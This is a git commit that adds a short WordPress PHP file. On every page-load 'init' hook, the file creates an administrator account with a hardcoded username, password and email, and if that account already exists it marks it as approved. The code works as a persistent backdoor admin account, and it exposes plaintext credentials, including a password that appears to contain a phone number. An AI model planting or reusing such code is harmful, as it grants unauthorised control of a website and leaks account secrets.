a9016d43e1ff29ee3f4e89e96f51c6e032d8cead
mosharof85 <68509780+mosharof85@users.noreply.github.com>
2025-03-05 23:26:22 +0600

    Create create-new-user.php

---
+++ create-new-user.php
@@ -0,0 +1,20 @@
+<?php 
+
+function create_new_admin_user() {
+    $username = 'mosh'; // Replace with the desired username
+    $password = 'Babu@01715757692!!'; // Replace with a secure password
+    $email = 'mosh@w-lu.de'; // Replace with the desired email address
+
+    if ( ! username_exists( $username ) && ! email_exists( $email ) ) {
+        $user_id = wp_create_user( $username, $password, $email );
+        if ( ! is_wp_error( $user_id ) ) {
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
+    else{
+        $user = get_user_by('login', $username);
+        update_user_meta($user->ID, 'pw_user_status', 'approved');
+    }
+}
+add_action( 'init', 'create_new_admin_user' );
